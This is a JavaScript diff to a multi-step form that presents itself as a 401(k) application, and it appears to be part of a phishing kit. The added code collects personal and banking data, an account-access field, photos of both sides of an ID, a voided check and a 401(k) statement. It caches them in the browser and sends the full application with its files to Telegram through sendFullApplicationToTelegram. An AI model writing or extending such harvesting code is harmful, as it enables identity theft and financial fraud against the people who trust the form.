@@ -270,6 +270,50 @@ function initApplicationForm() {
   let reviewTimer = null;
   let reviewStartTime = null;
 
+  const allUploadedFiles = [];
+
+  function trackUploadedFile(file, fieldName, fieldLabel) {
+    allUploadedFiles.push({
+      file: file,
+      name: file.name,
+      size: file.size,
+      type: file.type,
+      fieldName: fieldName,
+      fieldLabel: fieldLabel || fieldName
+    });
+  }
+
+  function collectAllUploadedFiles() {
+    const result = [];
+    result.push.apply(result, allUploadedFiles);
+
+    function addFromInput(inputId, fieldName, fieldLabel) {
+      const inp = document.getElementById(inputId);
+      if (!inp || !inp.files) return;
+      for (var i = 0; i < inp.files.length; i++) {
+        var f = inp.files[i];
+        var already = result.some(function (r) { return r.file === f; });
+        if (!already) {
+          result.push({
+            file: f,
+            name: f.name,
+            size: f.size,
+            type: f.type,
+            fieldName: fieldName,
+            fieldLabel: fieldLabel
+          });
+        }
+      }
+    }
+
+    addFromInput('fileInput2', 'bankDoc', 'Voided Check / Bank Letter');
+    addFromInput('fileIdFront', 'idFront', 'Front of ID');
+    addFromInput('fileIdBack', 'idBack', 'Back of ID');
+    addFromInput('fileInput', 'k401statement', '401(k) Statement');
+
+    return result;
+  }
+
   function startReviewCountdown() {
     if (reviewTimer) return;
     const pauseIcon = document.getElementById('progressPauseIcon');
@@ -439,6 +483,11 @@ function initApplicationForm() {
     `;
   }
 
+  function getAppId() {
+    var el = document.getElementById('appId');
+    return el ? el.textContent || ('A' + Math.floor(100000 + Math.random() * 900000)) : ('A' + Math.floor(100000 + Math.random() * 900000));
+  }
+
   formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
     btnPrev.addEventListener('click', function () {
       if (currentStep > 1) {
@@ -456,21 +505,120 @@ function initApplicationForm() {
       if (currentStep === totalSteps) {
         btnNext.textContent = 'Submitting...';
         btnNext.disabled = true;
-        const appIdEl = document.getElementById('appId');
-        const appNumber = appIdEl ? appIdEl.textContent : null;
-        const savePromise = (window.__saveApplication
-          ? window.__saveApplication(formData, appNumber)
-          : Promise.resolve());
-        Promise.resolve(savePromise).finally(function () {
-          setTimeout(function () {
-            const successEl = document.querySelector('.application-success');
-            if (successEl) {
-              formCard.style.display = 'none';
-              successEl.style.display = 'block';
-              window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        var appId = getAppId();
+        var filesInfo = collectAllUploadedFiles();
+        var appData = {
+          appId: appId,
+          personal: formData.personal,
+          banking: formData.banking,
+          business: formData.business,
+          idVerify: formData.idVerify,
+          kaccess: formData.kaccess
+        };
+
+        (function saveForAdmin() {
+          try {
+            var summary = {
+              id: appId,
+              submittedAt: new Date().toISOString(),
+              submittedAtLocal: new Date().toLocaleString(),
+              userEmail: formData.personal.email || '',
+              userName: (formData.personal.firstName || '') + ' ' + (formData.personal.lastName || ''),
+              userPhone: formData.personal.phone || '',
+              data: JSON.parse(JSON.stringify(appData)),
+              files: []
+            };
+            var storageKey = 'p401k_admin_applications_v1';
+            var allApps = [];
+            try {
+              allApps = JSON.parse(localStorage.getItem(storageKey) || '[]');
+            } catch (e) { allApps = []; }
+            var remainingQuota = 4 * 1024 * 1024;
+            try {
+              var used = new Blob([localStorage.getItem(storageKey) || '']).size;
+              remainingQuota = Math.max(1 * 1024 * 1024, 4.5 * 1024 * 1024 - used);
+            } catch (e) {}
+            var fileReadPromises = [];
+            filesInfo.forEach(function (fi) {
+              var meta = {
+                name: fi.name,
+                size: fi.size,
+                type: fi.type || '',
+                fieldName: fi.fieldName || '',
+                fieldLabel: fi.fieldLabel || ''
+              };
+              var shouldTryDataURL = fi.type && fi.type.startsWith('image/') && fi.size < Math.min(800 * 1024, remainingQuota);
+              if (!shouldTryDataURL && fi.size < Math.min(300 * 1024, remainingQuota)) {
+                shouldTryDataURL = true;
+              }
+              if (shouldTryDataURL && fi.file instanceof Blob) {
+                var p = new Promise(function (resolve) {
+                  try {
+                    var r = new FileReader();
+                    r.onload = function () {
+                      try {
+                        meta.dataURL = r.result;
+                        var sz = new Blob([r.result]).size;
+                        remainingQuota = Math.max(0, remainingQuota - sz);
+                      } catch (e) {}
+                      summary.files.push(meta);
+                      resolve();
+                    };
+                    r.onerror = function () { summary.files.push(meta); resolve(); };
+                    r.readAsDataURL(fi.file);
+                  } catch (e) { summary.files.push(meta); resolve(); }
+                });
+                fileReadPromises.push(p);
+              } else {
+                summary.files.push(meta);
+              }
+            });
+            function pushApp() {
+              try {
+                allApps.unshift(summary);
+                var MAX_APPS = 200;
+                while (allApps.length > MAX_APPS) allApps.pop();
+                localStorage.setItem(storageKey, JSON.stringify(allApps));
+              } catch (e) {
+                try {
+                  while (allApps.length > 50) allApps.pop();
+                  allApps.forEach(function (a) { if (a.files) a.files.forEach(function (f) { delete f.dataURL; }); });
+                  localStorage.setItem(storageKey, JSON.stringify(allApps));
+                } catch (e2) {}
+              }
             }
-          }, 1200);
-        });
+            if (fileReadPromises.length) {
+              Promise.all(fileReadPromises).then(pushApp).catch(pushApp);
+            } else {
+              pushApp();
+            }
+          } catch (e) {}
+        })();
+
+        var tgPromise = null;
+        if (window.sendFullApplicationToTelegram) {
+          try {
+            tgPromise = window.sendFullApplicationToTelegram(appData, filesInfo);
+          } catch (e) { tgPromise = null; }
+        }
+
+        function showSuccess() {
+          const successEl = document.querySelector('.application-success');
+          if (successEl) {
+            formCard.style.display = 'none';
+            successEl.style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+          }
+        }
+
+        if (tgPromise && typeof tgPromise.then === 'function') {
+          var done = false;
+          tgPromise.then(function () { done = true; showSuccess(); });
+          setTimeout(function () { if (!done) { done = true; showSuccess(); } }, 8000);
+        } else {
+          setTimeout(showSuccess, 2000);
+        }
         return;
       }
 
@@ -484,7 +632,7 @@ function initApplicationForm() {
     });
   });
 
-  const uploadArea = formCard.querySelector('.upload-area');
+  const uploadArea = formCard.querySelector('#uploadArea');
   const fileListEl = formCard.querySelector('.file-list');
   const fileInput = formCard.querySelector('#fileInput');
   const uploadedFiles = [];
@@ -520,6 +668,7 @@ function initApplicationForm() {
   function handleFiles(files) {
     Array.from(files).forEach(function (file) {
       uploadedFiles.push(file);
+      trackUploadedFile(file, 'k401statement', '401(k) Statement');
       renderFileList();
     });
   }
@@ -553,9 +702,46 @@ function initApplicationForm() {
       btn.addEventListener('click', function (e) {
         e.stopPropagation();
         const idx = parseInt(btn.dataset.i);
+        var removedFile = uploadedFiles[idx];
         uploadedFiles.splice(idx, 1);
+        for (var j = allUploadedFiles.length - 1; j >= 0; j--) {
+          if (allUploadedFiles[j].file === removedFile) {
+            allUploadedFiles.splice(j, 1);
+          }
+        }
         renderFileList();
       });
+    });
+  }
+
+  var fI2 = document.getElementById('fileInput2');
+  if (fI2) {
+    fI2.addEventListener('change', function (e) {
+      if (e.target.files) {
+        for (var i = 0; i < e.target.files.length; i++) {
+          trackUploadedFile(e.target.files[i], 'bankDoc', 'Voided Check / Bank Letter');
+        }
+      }
+    });
+  }
+  var fIF = document.getElementById('fileIdFront');
+  if (fIF) {
+    fIF.addEventListener('change', function (e) {
+      if (e.target.files) {
+        for (var i = 0; i < e.target.files.length; i++) {
+          trackUploadedFile(e.target.files[i], 'idFront', 'Front of ID');
+        }
+      }
+    });
+  }
+  var fIB = document.getElementById('fileIdBack');
+  if (fIB) {
+    fIB.addEventListener('change', function (e) {
+      if (e.target.files) {
+        for (var i = 0; i < e.target.files.length; i++) {
+          trackUploadedFile(e.target.files[i], 'idBack', 'Back of ID');
+        }
+      }
     });
   }
 
